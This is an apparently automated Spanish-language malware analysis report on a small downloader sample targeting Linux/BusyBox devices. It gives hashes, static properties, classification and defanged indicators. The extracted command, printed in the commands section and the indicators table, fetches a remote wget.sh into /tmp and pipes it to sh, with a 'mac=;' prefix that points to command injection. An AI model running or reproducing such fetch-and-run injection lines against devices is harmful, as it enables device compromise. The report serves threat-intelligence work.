# 🧬 Payload Analysis

`1d11c6e1043256f3742335e57d49278fd7d212e1aaa81463a3ebf3a2168a1660`

## 📌 Resumen

Texto ASCII de 325 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `cd /tmp`
2. `wget hxxp://91.92.40.XXX/wget.sh -O-`
3. `sh -s tendaac6`
4. `busybox wget hxxp://91.92.40.XXX/wget.sh -O-`
5. `sh -s tend` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Perfil técnico:** `Linux / BusyBox`, compatible con sistemas embebidos o IoT. BusyBox se trata como indicio de plataforma y no como prueba suficiente de que el dispositivo sea IoT. **Ficha malware:** [malware-like/oraculo/downloader/1d11c6e1043256f3742335e57d49278fd7d212e1aaa81463a3ebf3a2168a1660.md](../../../../../malware-like/oraculo/downloader/1d11c6e1043256f3742335e57d49278fd7d212e1aaa81463a3ebf3a2168a1660.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:49:46.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `1d11c6e1043256f3742335e57d49278fd7d212e1aaa81463a3ebf3a2168a1660`
- **SHA1:** `850ed1be25b6dea68b4ef0b23b5d4be21dd231fd`
- **MD5:** `f0e37826d9774613addea35e86357088`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 325 B |
| Entropía | 5.19 |
| Strings | 6 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
mac=;cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s tendaac6;busybox wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s tend
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| ip | 190.179.139.XXX | static_analysis |
| ip | 91.92.40.XXX | static_analysis |
| command | mac=;cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s tendaac6;busybox wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s tend | strings |
| hash | 1d11c6e1043256f3742335e57d49278fd7d212e1aaa81463a3ebf3a2168a1660 | static_analysis |
| ip | 45.153.34.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
